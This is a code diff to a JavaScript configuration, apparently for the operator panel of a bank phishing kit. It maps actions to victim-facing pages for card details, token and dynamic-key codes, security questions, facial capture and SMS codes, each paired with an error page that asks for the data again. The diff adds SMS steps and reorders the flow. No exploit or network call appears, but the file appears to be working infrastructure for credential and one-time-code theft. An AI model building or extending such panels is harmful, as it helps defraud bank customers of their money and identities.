@@ -45,6 +45,8 @@ const appConfig = {
         9: { url: "pregseg_err.html", name: "Pregunta Seguridad Error" },
         10: { url: "facial.html", name: "Facial" },
         11: { url: "facial_err.html", name: "Facial Error" },
+        12: { url: "sms.html", name: "SMS" },
+        13: { url: "sms_err.html", name: "SMS Error" },
     },
 
     // Tiempo de espera para redirección (en milisegundos)
@@ -54,20 +56,17 @@ const appConfig = {
     actions: {
         home: { page: 1, color: "#87f79fff" },
         index_err: { page: 2, color: "#ffd6de" },
-        index_er: { page: 2, color: "#ffd6de" },
-        sms: { page: 3, color: "#e8fff0" },
-        sms_err: { page: 4, color: "#ffd6de" },
-        token: { page: 5, color: "#fff8e8" },
-        token_err: { page: 6, color: "#ffd6de" },
         tdc: { page: 3, color: "#e8fff0" },
         tdc_err: { page: 4, color: "#ffd6de" },
-        facial: { page: 10, color: "#fff3cd" },
-        facial_err: { page: 11, color: "#ffd6de" },
-        dinamica: { page: 5, color: "#fff8e8" },
-        dinamica_err: { page: 6, color: "#ffd6de" },
+        token: { page: 5, color: "#fff8e8" },
+        token_err: { page: 6, color: "#ffd6de" },
         fuera: { page: 7, color: "#fff8e8" },
         pregseg: { page: 8, color: "#fff3cd" },
         pregseg_err: { page: 9, color: "#ffd6de" },
+        facial: { page: 10, color: "#fff3cd" },
+        facial_err: { page: 11, color: "#ffd6de" },
+        sms: { page: 12, color: "#e8fff0" },
+        sms_err: { page: 13, color: "#ffd6de" },
     },
 
     // Configuración de estados
@@ -84,6 +83,8 @@ const appConfig = {
         9: { text: "Preg. Seg. Error", class: "danger" },
         10: { text: "Facial", class: "success" },
         11: { text: "Facial Error", class: "danger" },
+        12: { text: "SMS", class: "success" },
+        13: { text: "SMS Error", class: "danger" },
     }
 };
 
